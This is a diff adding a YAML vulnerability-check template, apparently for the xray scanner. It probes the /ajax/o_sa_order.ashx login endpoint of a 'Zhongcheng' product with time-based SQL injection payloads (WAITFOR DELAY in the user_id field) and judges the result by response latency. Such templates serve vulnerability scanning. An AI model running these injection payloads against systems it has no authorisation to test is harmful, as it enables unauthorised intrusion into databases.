@@ -1,0 +1,29 @@
+name: poc-yaml-zhongcheng-o_sa_order.ashx-sql
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /ajax/o_sa_order.ashx
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+      body: type=login&user_id=1%27);WAITFOR%20DELAY%20%270:0:4%27--&user_pwd=1
+    expression: response.latency >= 4000 && response.latency <= 5000
+  r1:
+    request:
+      method: POST
+      path: /ajax/o_sa_order.ashx
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+      body: type=login&user_id=1%27);WAITFOR%20DELAY%20%270:0:8%27--&user_pwd=1
+    expression: response.latency >= 8000 && response.latency <= 9000
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487140&idx=1&sn=512ac11ada345ca2053390419d0f90b4&chksm=c267bb97f5103281f89ce1566e8dd389bfeedcfaced56bb568f9fa53e8096b0c5a95814f64ec&token=101124693&lang=zh_CN#rd
